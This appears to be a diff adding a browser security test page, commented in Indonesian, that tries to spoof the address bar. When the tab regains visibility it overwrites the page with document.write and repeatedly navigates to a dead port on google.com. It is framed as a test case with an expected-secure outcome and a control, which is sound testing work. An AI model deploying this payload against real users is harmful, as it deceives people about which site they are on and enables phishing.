@@ -1,0 +1,17 @@
+<!-- 5 | address-bar spoof - PEMICU visibilitychange | [NO-CLICK]
+     GENOME  A=dead-port  B=location=  C=visibilitychange (kembali ke tab)  D=S1  F=document.write
+     CARA UJI  buka file ini -> pindah ke tab lain -> KEMBALI ke tab ini. Nol klik di halaman.
+     KENAPA INI BEDA  spoof dicat tepat saat tab jadi terlihat lagi, momen ketika omnibox
+     sedang di-repaint. Lengan waktu ini beda dari onload/klik.
+     EXPECTED-SECURE  omnibox tetap jujur setelah tab kembali aktif. KONTROL  3.html -->
+<h3>Pindah ke tab lain, lalu kembali ke sini.</h3>
+<p id=r></p>
+<script>
+document.getElementById('r').textContent = 'REAL ORIGIN: ' + location.href;
+document.addEventListener('visibilitychange', function () {
+  if (document.visibilityState !== 'visible') return;
+  document.write('<h2>SPOOFED saat tab kembali &mdash; bukan google.com</h2>');
+  location = 'https://www.google.com:82';
+  setInterval(function () { location = 'https://www.google.com:82'; }, 9800);
+});
+</script>
